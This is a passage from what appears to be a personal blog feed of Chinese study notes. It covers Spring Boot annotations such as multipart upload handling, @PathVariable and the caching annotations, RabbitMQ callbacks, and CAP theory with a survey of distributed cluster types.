class="hljs-keyword">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>  body: formData<br>&#125;)<br>.<span class="hljs-keyword">then</span>(response =&gt; response.text())<br>.<span class="hljs-keyword">then</span>(data =&gt; console.log(data));<br><br><br>// <span class="hljs-number">3.</span> 发送请求<br>POST /upload HTTP/<span class="hljs-number">1.1</span><br>Content-<span class="hljs-keyword">Type</span>: multipart/form-data; boundary=<span class="hljs-comment">----WebKitFormBoundary</span><br><br><span class="hljs-comment">------WebKitFormBoundary</span><br>Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;description&quot;<br>我的照片<br><span class="hljs-comment">------WebKitFormBoundary</span><br>Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;photo.jpg&quot;<br>Content-<span class="hljs-keyword">Type</span>: image/jpeg<br>[二进制文件内容]<br><span class="hljs-comment">------WebKitFormBoundary</span><br>Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;metadata&quot;<br>Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span><br>&#123;&quot;title&quot;: &quot;我的照片&quot;&#125;<br><span class="hljs-comment">------WebKitFormBoundary--</span><br><br><br>// <span class="hljs-number">4.</span> 后端接收<br>@PostMapping(<span class="hljs-keyword">value</span> = &quot;/upload&quot;, consumes = &quot;multipart/form-data&quot;)<br><span class="hljs-built_in">public</span> String uploadData(@RequestPart(&quot;file&quot;) MultipartFile file,<br>                         @RequestPart(&quot;metadata&quot;) Metadata metadata,<br>                         @RequestParam(&quot;description&quot;) String description) &#123;<br>    <span class="hljs-keyword">return</span> &quot;文件: &quot; + file.getOriginalFilename() + <br>           &quot;, 标题: &quot; + metadata.getTitle() + <br>           &quot;, 描述: &quot; + description;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="1-1-7-PathVariable"><a href="#1-1-7-PathVariable" class="headerlink" title="1.1.7. @PathVariable"></a>1.1.7. @PathVariable</h5><p><code>@PathVariable</code> 用于将 URL 路径中的变量 绑定到方法参数上，是拿来处理RESTful 风格的路径参数的：</p><ol><li>&#x3D;&#x3D;URL 路径中的变量&#x3D;&#x3D;：<ol><li>类似于：<code>@GetMapping(&quot;/user/&#123;name&#125;/&#123;age&#125;&quot;)</code> 和 <code>GET /user/laowang/18</code></li><li>这就是 RESTful 风格的路径参数，不像我们传统的 <code>GET /user?name=Tom&amp;age=18</code><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs julia"><span class="hljs-comment"># 1. 语法结构</span><br><span class="hljs-meta">@PathVariable</span>(<span class="hljs-string">&quot;路径变量名&quot;</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">注意事项：</span><br><span class="hljs-string">1. 参数名一致时可以省略路径变量名</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 2. 示例一</span><br><span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/user/&#123;id&#125;&quot;</span>)<br>public <span class="hljs-built_in">String</span> getUser(<span class="hljs-meta">@PathVariable</span>(<span class="hljs-string">&quot;id&quot;</span>) Long userId) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User ID: &quot;</span> + userId;<br>&#125;<br><br><br><span class="hljs-comment"># 3. 示例二</span><br><span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/book/&#123;isbn&#125;&quot;</span>)<br>public <span class="hljs-built_in">String</span> getBook(<span class="hljs-meta">@PathVariable</span> <span class="hljs-built_in">String</span> isbn) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ISBN: &quot;</span> + isbn;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><hr><h4 id="Spring-IOC-相关注解"><a href="#Spring-IOC-相关注解" class="headerlink" title="Spring IOC 相关注解"></a>Spring IOC 相关注解</h4><h5 id="组件相关注解"><a href="#组件相关注解" class="headerlink" title="组件相关注解"></a>组件相关注解</h5><p>在类上标注 <code>@Component</code> 及其衍生注解（如 <code>@Service</code>, <code>@Repository</code>, <code>@Controller</code>），以指示该类是一个 Bean类并声明唯一个Bean 对象。</p><ul><li><code>@Component</code>：标注通用组件</li><li><code>@Service</code>：标注业务逻辑层（service 层）</li><li><code>@Repository</code>：标注数据访问层（dao 层、mapper 层）</li><li><code>@Controller</code>：标注表现层（Web 层），用于<strong>处理 HTTP 请求</strong></li><li><code>@RestController</code>：<code>@RestController</code> &#x3D; <code>@Controller</code> + <code>@ResponseBody</code> ，使得每个方法的返回值都直接作为 HTTP 响应体返回。</li></ul><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>@Controller</code> 与其他 Bean 有所不同。通常我们通过注入 Bean 并手动调用其方法，而 <code>@Controller</code> 中的方法是由 HTTP 请求触发执行的，并不需要我们显式调用</li></ol></blockquote><hr><h4 id="Spring-Data-Redis-相关注解"><a href="#Spring-Data-Redis-相关注解" class="headerlink" title="Spring Data Redis 相关注解"></a>Spring Data Redis 相关注解</h4><h5 id="EnableCaching"><a href="#EnableCaching" class="headerlink" title="@EnableCaching"></a>@EnableCaching</h5><p>在启动类或配置类上添加<code> @EnableCaching</code> 注解，用于启动缓存功能</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@EnableCaching</span><br><span class="hljs-variable">@SpringBootApplication</span><br>public class MallTinyApplication &#123;<br>    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">static</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">main</span>(String[] args) &#123;<br>        <span class="hljs-selector-tag">SpringApplication</span><span class="hljs-selector-class">.run</span>(MallTinyApplication.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="Cacheable"><a href="#Cacheable" class="headerlink" title="@Cacheable"></a>@Cacheable</h5><p><code>@Cacheable</code> 一般用在查询方法上。如果缓存里有数据，就直接取缓存，不会执行方法；如果缓存没有，就执行方法，并把返回结果放进缓存（有 <code>condition</code>、<code>unless</code> 不算）</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment"># 1. 语法结构</span><br><span class="hljs-variable">@Cacheable</span>(<br>    value     = <span class="hljs-string">&quot;user&quot;</span>,<br>    key       = <span class="hljs-string">&quot;#id&quot;</span>,<br>    condition = <span class="hljs-string">&quot;#id &gt; 100&quot;</span>,<br>    <span class="hljs-keyword">unless</span>    = <span class="hljs-string">&quot;#result == null&quot;</span><br>)<br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">1. value:</span><br><span class="hljs-string">1. 缓存的命名空间（必填）</span><br><span class="hljs-string">2. 和 key 一起组成 Redis 中的键，如：user::123，可以简单理解为是前缀</span><br><span class="hljs-string">3. 如果我们在配置类中配置了前缀，最后可能的结果为：mall:user::123</span><br><span class="hljs-string">2. key：</span><br><span class="hljs-string">1. 设置在命名空间中的缓存 key 值，可以使用 SpEL 表达式定义；</span><br><span class="hljs-string">3. condition：</span><br><span class="hljs-string">1. 条件符合则缓存。</span><br><span class="hljs-string">4. unless：</span><br><span class="hljs-string">1. 条件符合则不缓存；</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"># 2. 示例一</span><br><span class="hljs-string">@Cacheable(</span><br><span class="hljs-string">    value     = &quot;</span>user<span class="hljs-string">&quot;,</span><br><span class="hljs-string">    key       = &quot;</span><span class="hljs-comment">#id&quot;,</span><br>    condition = <span class="hljs-string">&quot;#id &gt; 100&quot;</span>,<br>    <span class="hljs-keyword">unless</span>    = <span class="hljs-string">&quot;#result == null&quot;</span><br>)<br><span class="hljs-keyword">public</span> <span class="hljs-title class_">User</span> getUserById(<span class="hljs-title class_">Long</span> id) &#123;<br>    <span class="hljs-title class_">System</span>.out.println(<span class="hljs-string">&quot;方法执行，id = &quot;</span> + id);<br>    <span class="hljs-keyword">return</span> userRepository.findById(id).orElse(null);<br>&#125;<br></code></pre></td></tr></table></figure><p>注意：虽然正常情况下是按照上述流程执行的，但一旦使用了 <code>condition</code> 或 <code>unless</code>，这个顺序会被打乱。<br>&#x3D;&#x3D;1.只有 condition 的情况&#x3D;&#x3D;</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css">flowchart LR<br>  <span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[开始调用]</span> --&gt; <span class="hljs-selector-tag">B</span>&#123;是否符合 condition&#125;<br>  <span class="hljs-selector-tag">B</span> -- 否 --&gt; C<span class="hljs-selector-attr">[执行方法（跳过读写缓存）]</span><br>  C --&gt; D<span class="hljs-selector-attr">[返回结果]</span><br>  <span class="hljs-selector-tag">B</span> -- 是 --&gt; E&#123;是否缓存命中&#125;<br>  E -- 是 --&gt; F<span class="hljs-selector-attr">[返回缓存结果]</span><br>  E -- 否 --&gt; <span class="hljs-selector-tag">G</span><span class="hljs-selector-attr">[执行方法]</span><br>  <span class="hljs-selector-tag">G</span> --&gt; H<span class="hljs-selector-attr">[写入缓存]</span><br>  H --&gt; <span class="hljs-selector-tag">I</span><span class="hljs-selector-attr">[返回结果]</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/02/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Boot/image-20250517211323498.png"></p><p>&#x3D;&#x3D;2.只有 unless 的情况&#x3D;&#x3D;</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css">flowchart LR<br>  <span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[开始调用]</span> --&gt; <span class="hljs-selector-tag">B</span>&#123;是否缓存命中&#125;<br>  <span class="hljs-selector-tag">B</span> -- 是 --&gt; C<span class="hljs-selector-attr">[返回缓存结果]</span><br>  <span class="hljs-selector-tag">B</span> -- 否 --&gt; D<span class="hljs-selector-attr">[执行方法]</span><br>  D --&gt; E&#123;是否符合 unless&#125;<br>  E -- 是 --&gt; F<span class="hljs-selector-attr">[返回结果（不写缓存）]</span><br>  E -- 否 --&gt; <span class="hljs-selector-tag">G</span><span class="hljs-selector-attr">[写入缓存]</span><br>  <span class="hljs-selector-tag">G</span> --&gt; H<span class="hljs-selector-attr">[返回结果]</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/02/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Boot/image-20250517211409902.png"></p><p>&#x3D;&#x3D;3.conditon 和 unless 都有的情况&#x3D;&#x3D;</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">flowchart LR</span><br>  <span class="hljs-comment">A</span><span class="hljs-title">[</span><span class="hljs-comment">开始调用</span><span class="hljs-title">]</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">B&#123;是否符合 condition&#125;</span><br>  <span class="hljs-comment">B</span> <span class="hljs-literal">--</span> <span class="hljs-comment">否</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">C</span><span class="hljs-title">[</span><span class="hljs-comment">执行方法（跳过读写缓存）</span><span class="hljs-title">]</span><br>  <span class="hljs-comment">C</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">D</span><span class="hljs-title">[</span><span class="hljs-comment">返回结果</span><span class="hljs-title">]</span><br>  <span class="hljs-comment">B</span> <span class="hljs-literal">--</span> <span class="hljs-comment">是</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">E&#123;是否缓存命中&#125;</span><br>  <span class="hljs-comment">E</span> <span class="hljs-literal">--</span> <span class="hljs-comment">是</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">F</span><span class="hljs-title">[</span><span class="hljs-comment">返回缓存结果</span><span class="hljs-title">]</span><br>  <span class="hljs-comment">E</span> <span class="hljs-literal">--</span> <span class="hljs-comment">否</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">G</span><span class="hljs-title">[</span><span class="hljs-comment">执行方法</span><span class="hljs-title">]</span><br>  <span class="hljs-comment">G</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">H&#123;是否符合 unless&#125;</span><br>  <span class="hljs-comment">H</span> <span class="hljs-literal">--</span> <span class="hljs-comment">是</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">I</span><span class="hljs-title">[</span><span class="hljs-comment">返回结果</span><span class="hljs-title">]</span><br>  <span class="hljs-comment">H</span> <span class="hljs-literal">--</span> <span class="hljs-comment">否</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">J</span><span class="hljs-title">[</span><span class="hljs-comment">写入缓存</span><span class="hljs-title">]</span><br>  <span class="hljs-comment">J</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">I</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/02/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Boot/image-20250517210734445.png"></p><hr><h5 id="CachePut"><a href="#CachePut" class="headerlink" title="@CachePut"></a>@CachePut</h5><p><code>@CachePut</code> 一般用在新增方法上，每次执行时都会把返回结果存入缓存（有 <code>condition</code>、<code>unless</code> 不算），使用方法和 <code>@Cacheable</code> 一样</p><hr><h5 id="CacheEvict"><a href="#CacheEvict" class="headerlink" title="@CacheEvict"></a>@CacheEvict</h5><p><code>@CacheEvict</code> 一般用在更新或删除方法上，每次执行时会清空缓存（有 <code>condition</code> 不算），使用方法和 <code>@Cacheable</code> 类似，不过，该注解没有 <code>unless</code> 属性，只有 <code>value</code>、<code>key</code> 和 <code>condition</code> 三个属性。并且 <code>condition</code> 的判断方式相对简单，只要条件满足就执行清空缓存操作，否则不清空。</p><hr><p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/pring%20Boot/image-20250617161457306.png"></p><h1 id="乱七八糟"><a href="#乱七八糟" class="headerlink" title="乱七八糟"></a>乱七八糟</h1><h3 id="1-Spring-Boot-如何加载配置文件"><a href="#1-Spring-Boot-如何加载配置文件" class="headerlink" title="1. Spring Boot 如何加载配置文件"></a>1. Spring Boot 如何加载配置文件</h3><ol><li>&#x3D;&#x3D;Spring Boot 启动后加载配置文件的顺序&#x3D;&#x3D;<ol><li><font color="#00b0f0">读取本地 bootstrap.yml</font><ol><li>仅用来告诉 Spring：去哪里（Consul 地址）、哪个前缀（prefix）、哪种上下文（context）拉取远程配置。</li></ol></li><li><font color="#00b0f0">从 Consul 拉取远程配置</font><ol><li>由 bootstrap 上下文发起，拉到的配置被放入父环境（PropertySource 名称类似 <code>bootstrap</code> 或 <code>configService</code>）。</li></ol></li><li><font color="#00b0f0">读取本地 application.yml</font><ol><li>把本地项目配置加载到子环境中。</li></ol></li><li><font color="#00b0f0">读取命令行参数、系统属性、环境变量</font><ol><li>最后注入，用于临时调试或生产环境动态调整。</li></ol></li><li><font color="#00b0f0">注意</font>：<ul><li>加载顺序 ≠ 覆盖顺序，后加载的并不一定就能覆盖前面的。</li></ul></li></ol></li><li>&#x3D;&#x3D;配置文件覆盖优先级（前覆盖后）&#x3D;&#x3D;：<ol><li>命令行参数 &#x2F; 系统属性 &#x2F; 环境变量</li><li>远程配置中心（Consul）</li><li>本地 <code>application.yml</code></li><li>本地 <code>bootstrap.yml</code></li></ol></li></ol><p>@GetMapping(“&#x2F;flatmap”) 路径推荐小写，可以flatMap，也可以推荐flat-map</p><p>@RequestParam</p><p><img src="/2025/05/02/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Boot/image-20250513162343394.png"><br>分别该怎么拿</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@Configuration</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RabbitCallBackConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RabbitTemplate</span>.<span class="hljs-property">ConfirmCallback</span>, <span class="hljs-title class_">RabbitTemplate</span>.<span class="hljs-property">ReturnsCallback</span> &#123;  <br>    <span class="hljs-meta">@Autowired</span>  <br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">RabbitTemplate</span> rabbitTemplate;  <br>  <br>    <span class="hljs-meta">@PostConstruct</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">initRabbitTemplate</span>(<span class="hljs-params"></span>) &#123;  <br>        rabbitTemplate.<span class="hljs-title function_">setConfirmCallback</span>(<span class="hljs-variable language_">this</span>);  <br>        rabbitTemplate.<span class="hljs-title function_">setReturnsCallback</span>(<span class="hljs-variable language_">this</span>);  <br>    &#125;  <br>    <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">confirm</span>(<span class="hljs-params"><span class="hljs-title class_">CorrelationData</span> correlationData, <span class="hljs-built_in">boolean</span> ack, <span class="hljs-title class_">String</span> cause</span>) &#123;  <br>        <span class="hljs-comment">// 当消息发送到交换机 成功或失败 时，会调用这个方法  </span><br>        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;confirm（）回调函数打印CorrelationData：&quot;</span>+correlationData);  <br>        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;confirm（）回调函数打印ack：&quot;</span>+ack);  <br>        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;confirm（）回调函数打印cause：&quot;</span>+cause);  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">returnedMessage</span>(<span class="hljs-params"><span class="hljs-title class_">ReturnedMessage</span> returnedMessage</span>) &#123;  <br>        <span class="hljs-comment">// 当消息发送到队列 失败时，才会调用这个方法  </span><br>        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;消息主体: &quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(returnedMessage.<span class="hljs-title function_">getMessage</span>().<span class="hljs-title function_">getBody</span>()));  <br>        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;应答码: &quot;</span> + returnedMessage.<span class="hljs-title function_">getReplyCode</span>());  <br>        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;描述: &quot;</span> + returnedMessage.<span class="hljs-title function_">getReplyText</span>());  <br>        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;消息使用的交换器 exchange : &quot;</span> + returnedMessage.<span class="hljs-title function_">getExchange</span>());  <br>        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;消息使用的路由键 routing : &quot;</span> + returnedMessage.<span class="hljs-title function_">getRoutingKey</span>());  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>但是如何让这个方法从一开始就进行工作呢？加postConstruct 方法，死去的回忆又开始攻击我了<br><img src="/image-20250510204814351.png"><br>这样就能实现初始化rabbitconfig的时候调用这个方法，对tabbittemplate 进行增强</p><hr><p><img src="/2025/05/02/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Boot/image-20250517125404803.png"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Spring 生态</category>
      
      <category>Spring Boot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：CAP 理论</title>
    <link href="/2025/05/01/%E7%AC%94%E8%AE%B0%EF%BC%9ACAP%20%E7%90%86%E8%AE%BA/"/>
    <url>/2025/05/01/%E7%AC%94%E8%AE%B0%EF%BC%9ACAP%20%E7%90%86%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<h3 id="1-CAP-理论概述"><a href="#1-CAP-理论概述" class="headerlink" title="1. CAP 理论概述"></a>1. CAP 理论概述</h3><p>CAP 理论指出：<strong>一个分布式系统无法同时完美地满足一致性（Consistency）、可用性（Availability）和分区容错性（Partition Tolerance）这三大特性</strong>，最多只能同时较好地满足其中两项。</p><ol><li>&#x3D;&#x3D;C（Consistency）一致性&#x3D;&#x3D;：<ol><li>所有节点在同一时间的数据完全一致。</li></ol></li><li>&#x3D;&#x3D;A（Availability）可用性&#x3D;&#x3D;：<ol><li>系统始终能对外提供服务，且每次请求都能获得响应（不一定是最新的）。</li></ol></li><li>&#x3D;&#x3D;P（Partition Tolerance）分区容错性&#x3D;&#x3D;：<ol><li>系统在遇到部分节点失联或网络分区时仍能继续运行。</li></ol></li></ol><p>基于 CAP 原则，架构大致可分为以下三类：</p><ul><li>&#x3D;&#x3D;CA 类型&#x3D;&#x3D;：<ul><li>满足一致性和可用性，常见于单点集群系统，但扩展性有限。</li></ul></li><li>&#x3D;&#x3D;CP 类型&#x3D;&#x3D;：<ul><li>满足一致性和分区容错性，系统稳定性强，但可能牺牲一定可用性。</li></ul></li><li>&#x3D;&#x3D;AP 类型&#x3D;&#x3D;：<ul><li>满足可用性和分区容错性，响应速度快，但对一致性的要求相对宽松。</li></ul></li></ul><p><img src="/2025/05/01/%E7%AC%94%E8%AE%B0%EF%BC%9ACAP%20%E7%90%86%E8%AE%BA/image-20250501191235422.png"></p><hr><p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/AP%20%E7%90%86%E8%AE%BA/image-20250626141217557.png"></p><h3 id="2-AP-架构"><a href="#2-AP-架构" class="headerlink" title="2. AP 架构"></a>2. AP 架构</h3><p>在网络分区发生时，<strong>为了保持系统可用性，系统B仍会响应请求，即使返回的是旧数据</strong>。</p><p>例如：当A和B之间网络断开，某些注册信息只存在于节点B，此时请求节点A可能查询不到，但请求节点B则能获得结果。虽然数据不一致，但服务依然对外正常运行。</p><p><strong>结论</strong>：为了保证可用性和分区容错性，牺牲了一致性，因此属于 <strong>AP 类型系统</strong>。<br><img src="/2025/05/01/%E7%AC%94%E8%AE%B0%EF%BC%9ACAP%20%E7%90%86%E8%AE%BA/image-20250501191351661.png">、</p><hr><h3 id="3-CP架构"><a href="#3-CP架构" class="headerlink" title="3. CP架构"></a>3. CP架构</h3><p>当系统发生网络分区时，<strong>如果要确保数据一致性，就必须拒绝部分请求</strong>，否则就可能出现数据冲突。</p><p>Consul 就是典型的 CP 架构系统，它采用 Raft 算法来实现一致性，要求大多数节点写入成功，服务才算注册成功。例如：如果 leader 节点挂掉，新的 leader 选举完成前，系统会短暂不可用。</p><p><strong>结论</strong>：该架构牺牲了可用性，换取一致性和分区容错性，因此属于 <strong>CP 类型系统</strong>。<br><img src="/2025/05/01/%E7%AC%94%E8%AE%B0%EF%BC%9ACAP%20%E7%90%86%E8%AE%BA/image-20250501191408958.png"></p><p>这个问题问得非常好，而且很“前瞻性”！<br>整个分布式系统世界里，“集群”并不只有一种，有各种不同的架构设计理念，各自适用于不同的业务场景和一致性需求。我们可以从几个维度来系统地梳理一下。</p><hr><h2 id="🧭-一、从架构角色来看，常见的集群类型包括："><a href="#🧭-一、从架构角色来看，常见的集群类型包括：" class="headerlink" title="🧭 一、从架构角色来看，常见的集群类型包括："></a>🧭 一、从架构角色来看，常见的集群类型包括：</h2><table><thead><tr><th>集群类型</th><th>简要描述</th><th>常见代表</th></tr></thead><tbody><tr><td>✅ <strong>主从集群（Master-Slave）</strong></td><td>一个主节点写，从节点读，通过复制保持数据同步</td><td>MySQL 主从、Redis Sentinel</td></tr><tr><td>✅ <strong>主主集群（Multi-Master）</strong></td><td>所有节点都能读写，冲突通过同步解决</td><td>MongoDB Sharded Cluster、CouchDB、ActiveMQ</td></tr><tr><td>✅ <strong>对等集群（Peer-to-Peer）</strong></td><td>所有节点角色平等，数据自动分布和协调</td><td>Elasticsearch、Cassandra、BitTorrent</td></tr><tr><td>✅ <strong>仲裁集群（Quorum-based）</strong></td><td>多数节点投票选举决定状态，提升容错能力</td><td>Kafka、ZooKeeper、etcd、MongoDB 副本集</td></tr><tr><td>✅ <strong>调度型集群（Scheduler-based）</strong></td><td>核心是任务分配、调度与资源协调</td><td>Kubernetes、Mesos、YARN</td></tr></tbody></table><hr><h2 id="🧩-二、从一致性模型分类（CAP-理论）"><a href="#🧩-二、从一致性模型分类（CAP-理论）" class="headerlink" title="🧩 二、从一致性模型分类（CAP 理论）"></a>🧩 二、从一致性模型分类（CAP 理论）</h2><p>CAP &#x3D; Consistency（一致性） + Availability（可用性） + Partition tolerance（分区容忍）</p><table><thead><tr><th>集群模型</th><th>更偏向</th><th>示例</th></tr></thead><tbody><tr><td><strong>CP 模型</strong></td><td>保证一致性和分区容忍</td><td>ZooKeeper、etcd、HDFS NameNode、Elasticsearch</td></tr><tr><td><strong>AP 模型</strong></td><td>保证可用性和分区容忍</td><td>Cassandra、DynamoDB、Riak</td></tr><tr><td><strong>CA 模型</strong></td><td>理论上存在但现实中无法容忍分区</td><td>单机数据库、关系型集群（如 MySQL 主从）</td></tr></tbody></table><hr><h2 id="🏗️-三、从功能和场景角度划分："><a href="#🏗️-三、从功能和场景角度划分：" class="headerlink" title="🏗️ 三、从功能和场景角度划分："></a>🏗️ 三、从功能和场景角度划分：</h2><h3 id="1-数据存储型集群"><a href="#1-数据存储型集群" class="headerlink" title="1. 数据存储型集群"></a>1. 数据存储型集群</h3><ul><li><p><strong>关系型：</strong> MySQL Group Replication, Oracle RAC</p></li><li><p><strong>NoSQL：</strong> MongoDB、Cassandra、HBase</p></li><li><p><strong>搜索分析：</strong> Elasticsearch、OpenSearch</p></li><li><p><strong>对象存储：</strong> MinIO、Ceph、GlusterFS</p></li></ul><h3 id="2-消息队列-流处理集群"><a href="#2-消息队列-流处理集群" class="headerlink" title="2. 消息队列&#x2F;流处理集群"></a>2. 消息队列&#x2F;流处理集群</h3><ul><li>Kafka、Pulsar、RabbitMQ、RocketMQ</li></ul><h3 id="3-计算调度集群"><a href="#3-计算调度集群" class="headerlink" title="3. 计算调度集群"></a>3. 计算调度集群</h3><ul><li>Kubernetes（K8s）、Hadoop YARN、Apache Mesos</li></ul><h3 id="4-配置-协调服务集群"><a href="#4-配置-协调服务集群" class="headerlink" title="4. 配置&#x2F;协调服务集群"></a>4. 配置&#x2F;协调服务集群</h3><ul><li>ZooKeeper、etcd、Consul（服务发现 + 配置）</li></ul><h3 id="5-安全容灾-备份集群"><a href="#5-安全容灾-备份集群" class="headerlink" title="5. 安全容灾&#x2F;备份集群"></a>5. 安全容灾&#x2F;备份集群</h3><ul><li>DRBD、GlusterFS、MySQL 双主同步</li></ul><hr><h2 id="🔍-对比小结（用途-特性）"><a href="#🔍-对比小结（用途-特性）" class="headerlink" title="🔍 对比小结（用途 + 特性）"></a>🔍 对比小结（用途 + 